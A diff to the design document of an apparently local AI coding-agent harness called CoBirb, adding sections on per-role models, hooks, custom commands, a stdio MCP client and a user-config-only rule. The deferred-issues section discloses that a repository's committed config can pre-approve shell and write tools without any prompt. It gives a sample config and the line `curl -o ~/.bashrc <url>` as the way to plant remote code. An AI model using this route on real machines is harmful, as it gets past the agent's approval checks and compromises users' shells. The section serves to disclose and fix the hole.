@@ -260,6 +260,99 @@ config — a more explicit authorization than `allow_tools`, which is a pattern 
 command — and CoBirb runs it, not the model. The model can neither choose it nor change it
 mid-session. Documented rather than quietly assumed.
 
+## 4h. One model per role
+
+`runtime/models.py` resolves a **role** — a job — rather than a model name. `default` is what
+everything falls back to, `orchestrator` is the agent you talk to and the only role with a caller
+today, `worker` is a subagent given one bounded piece of work and is reserved for the flock
+(§12). Roles inherit from `default` field by field, so a role may name a model without repeating
+the endpoint it is served from; `--model` outranks all of them. `cobirb models` prints how each
+one resolves *and where the answer came from*, including roles nobody recognises, so a typo is
+visible rather than a silent fallback.
+
+`worker` resolving before anything calls it is deliberate: a config written today can be checked
+today, instead of being discovered wrong on the first fan-out. The three older keys (`model`,
+`models.default.name`, `default_model`) all still name the `default` role, in that order —
+backward compatibility, not three behaviours.
+
+## 4i. Hooks
+
+`runtime/hooks.py`. A hook is the user's own command at one of four lifecycle points:
+`before_tool`, `after_tool`, `before_turn`, `after_turn`. The event arrives as JSON on stdin; exit
+0 proceeds.
+
+**`before_tool` is the only one that changes what happens.** A non-zero exit blocks the call and
+the hook's own output becomes the reason handed to the *model*, so a hook can say "infra/ is
+generated, edit the module instead" and be adapted to rather than retried. It fires **before the
+approval prompt**, because a prompt whose answer has already been overruled is a nonsense question.
+A hook can only refuse; anything it lets past still goes to the permission layer. The other three
+events are observations — a failing one is reported to the user and never blocks, because a
+formatter hook that has been quietly exiting 1 for a week is worse than no hook at all.
+
+A hook that **cannot be run, or times out, counts as a refusal**. Failing open there would mean a
+guard stops guarding at exactly the moment it breaks.
+
+## 4j. Custom commands
+
+`runtime/custom_commands.py`. A markdown file in `~/.cobirb/commands/` or
+`<project>/.cobirb/commands/` becomes `/<filename>`; `$ARGUMENTS` and `$1`…`$9` are filled from
+what followed it, and a body with no placeholder gets them appended rather than losing them.
+Optional `---`/`description:`/`---` frontmatter, read by a dozen lines rather than a YAML
+dependency, since the whole vocabulary is one key.
+
+Built-ins are resolved first, so a custom `/undo` cannot quietly change what `/undo` does. Both
+front-ends expand *before* sending, so the transcript shows what was actually asked. Discovery is
+per-submission, not cached at startup: editing a command and using it in the same session is how
+these get written.
+
+## 4k. MCP
+
+`mcp/` — a hand-written JSON-RPC 2.0 client over stdio (`client.py`) and a `Tool` wrapper
+(`tools.py`). Each remote tool becomes `mcp__<server>__<tool>` in the same registry as the
+built-ins, so the model schema, the approval prompt, the policy, redaction and the audit log all
+treat it identically. That is the point: MCP is a way of *acquiring* tools, not a second set of
+rules about what tools may do.
+
+Written by hand rather than depending on the official SDK: the wire format is JSON-RPC over a pipe
+and the handshake is three messages, while the SDK brings asyncio, pydantic and transports this
+client will never speak.
+
+**stdio only.** An MCP server over stdio is a subprocess on this machine talking over a pipe.
+HTTP/SSE transports point at a URL, and a URL is a network call CoBirb did not make and cannot see
+inside.
+
+Four things bound the damage, and all four are worth keeping:
+
+- **The environment is not inherited.** A server gets `PATH`, `HOME`, `LANG` plus whatever the user
+  listed under `env`. This is the one place a CoBirb-spawned subprocess could read cloud
+  credentials and tokens for unrelated services and send them anywhere. `"inherit_env": true` opts
+  out, per server.
+- **MCP tools are not in `READ_TOOLS`.** CoBirb cannot know whether a remote `fetch_issue` reads,
+  writes or bills someone, so the directory-scoped read grant must not generalise to it.
+- **A server that fails to start is an issue, never an exception** — reported on stderr and
+  skipped. A silent absence would present as the model inexplicably lacking a configured tool.
+- **The client owns the process.** `Orchestrator.close()` stops them; one-shot mode calls it in a
+  `finally`, and the TUI on every orchestrator discard and on unmount.
+
+What is *not* bounded, and is documented rather than pretended away: a configured server can open
+its own network connections and send the arguments of every call it receives anywhere it likes.
+CoBirb's promises are about CoBirb. `cobirb help mcp` says this plainly, and carries a worked
+example of writing an offline proxy — the case worth building for.
+
+## 4l. The user-config-only rule
+
+`Config.user_get()`. `hooks` and `mcp_servers` are read from `~/.cobirb/config.json` **only**,
+never from a repository's `cobirb.json`, even though every other key merges with repo-overrides-
+user precedence. Both execute code with no approval prompt in the way, so honouring them from a
+cloned directory would make cloning a repository sufficient to run its author's code — before the
+model is asked anything, and with no prompt to intervene, because the prompt is something CoBirb
+decides to show and this would be code deciding whether to show it.
+
+The cost is per-project hooks, which is real and accepted. The alternative is a permission model
+that the contents of a downloaded directory can rewrite.
+
+⚠️ **`allow_tools` does not yet follow this rule** — see §12.1.
+
 ## 5. Plugin SPI
 
 Core imports only these interfaces; plugins import only the SPI and never each other; core never
@@ -542,7 +635,10 @@ polish) and is imported lazily, so one-shot never loads it. Three live tabs:
   implementation per slot, discovery problems. It exists because a full-screen app's stderr is
   invisible, and that's where CLI modes report the same issues.
 
-Commands `/model`, `/persona [name]`, `/plan [on|off]`, `?`/`/help [topic]`. Keys: `f1` help, `f2`
+Commands `/model`, `/persona [name]`, `/plan [on|off]`, `/context`, `/undo`, `/diff`, `/export`,
+`/commands`, `?`/`/help [topic]`. Anything else beginning with `/` is looked up as a custom command
+(§4j) and otherwise goes to the model unchanged. Non-interactive: `cobirb models` (§4h) and
+`cobirb commands`. Keys: `f1` help, `f2`
 next tab, `ctrl+q` quit, `up`/`down` recall the last 100 prompts (memory only), `ctrl+c` copies a
 selection if there is one else cancels the turn. `/model` hot-swaps `orchestrator.model` in place
 rather than rebuilding, preserving this session's "always allow" approvals. `default_model` is
@@ -583,10 +679,14 @@ deeply. Nothing defaults to a networked provider. See `cobirb.json.example`.
 | `persona` | Default persona. Unset or `"none"` means none. |
 | `system_prompt` | `"off"` (default) or `"harness"` — §6. |
 | `plugins.model` / `.io` / `.crypto` | Select a discovered plugin for that slot. |
+| `models.<role>.name` / `.base_url` | One model per role — `default`, `orchestrator`, `worker`. Roles inherit from `default` field by field. §4h. |
 | `plan_mode`, `audit_log` | Both default `false`. Read §8 before enabling the latter. |
+| **`hooks`** | **User config only** (§4l). Your own commands at four lifecycle points; a `before_tool` hook can refuse a call. §4i. |
+| **`mcp_servers`** | **User config only** (§4l). Local MCP servers to start and take tools from. §4k. |
 
-Model name resolution: `--model` → `model` → `models.default.name` → `default_model`. All name the
-same thing; the multiplicity is backward compatibility, not three behaviors.
+Model name resolution: `--model` → `models.<role>.name` → `model` → `models.default.name` →
+`default_model`. The last three all name the `default` role; the multiplicity is backward
+compatibility, not three behaviors. `cobirb models` prints the result.
 
 Env: `COBIRB_HOME` (relocates the whole `.cobirb` tree — see `paths.py`; how tests isolate), `COBIRB_MODEL_NAME`,
 `COBIRB_OLLAMA_URL`, `COBIRB_PROJECT_DIR`, `COBIRB_TEST_MODEL`.
@@ -616,8 +716,10 @@ they are shaped around, deliberately.
   *Parallel read-only tools was dropped from the milestone — see §12.1.*
 - **v0.3.0 (done)** — `repo_map`, `/diff`, self-verification loop, secret redaction. Write-scope
   grants and session export landed early in 0.2. *Git auto-commit deferred — see §12.1.*
-- **v0.4.0 "Extensible"** — MCP client (stdio only), **embedded GGUF runtime**, per-role model
-  selection, hooks, custom commands/skills.
+- **v0.4.0 "Extensible"** — per-role model selection (§4h), hooks (§4i), custom commands (§4j),
+  MCP client over stdio (§4k) — all done. **Embedded GGUF runtime** is the remaining item and is
+  being designed with the user before any of it is written: it adds a compiled dependency, changes
+  the install story, and needs tool calling at the grammar level rather than borrowing Ollama's.
 - **v0.5.0 "The Flock"** — subagent orchestration: charter → scaffold → fan-out → integrate.
 - **v0.6.0–0.9.0** — plugin distribution, cross-session memory, vision, mid-turn steering,
   session branching, SPI freeze and session migrations.
@@ -632,6 +734,35 @@ the design, raise it with the user as a decision rather than resolving it in an 
 Designing to this year's ceiling is how a tool arrives obsolete.
 
 ### 12.1 Deferred, needing a decision
+
+**⚠️ `allow_tools` is readable from a repository's `cobirb.json`, and should probably not be.**
+Found while building §4l and **verified**, not theorised. A `cobirb.json` committed to a repository
+merges over the user's config like any other key, so cloning that repository and running CoBirb
+inside it pre-approves whatever it names, with **no prompt at any point**:
+
+```json
+{ "allow_tools": ["shell(curl)", "write_file"] }
+```
+
+`write_file` is then permitted for *any* path — `~/.bashrc` included, since the grant is the tool,
+not a directory — and `shell(curl)` permits `curl -o ~/.bashrc <url>`. (A pipe is refused by the
+shell-scope check, so the one-liner `curl … | sh` does not work; `curl -o` does, which is enough.)
+`allow_read_dirs` and `allow_write_dirs` are readable the same way.
+
+This predates hooks and MCP and is why §4l exists: those two were built on `user_get` from the
+start rather than inheriting this. Not fixed unilaterally because there is a real question inside
+it — whether a project should be able to declare standing permissions *at all* (a CI checkout with
+a reviewed `cobirb.json` is a legitimate want) or only ever propose them. Two candidate fixes:
+
+1. Read `allow_tools`/`allow_read_dirs`/`allow_write_dirs` through `user_get` like the other two.
+   One line each, and it closes the hole completely; it also breaks any existing project that
+   relies on a committed `cobirb.json`.
+2. Keep reading them, but require the user to have trusted that directory once — a first-run
+   prompt naming exactly what the project's config would grant.
+
+Until one is chosen, **`allow_tools` is not a security boundary against a repository you have not
+read**, and this paragraph is the honest statement of that.
+
 
 **Git auto-commit** — a commit per completed task, with a written message. Deferred because it
 writes to someone's repository history, which is not a default to drift into: it needs decisions
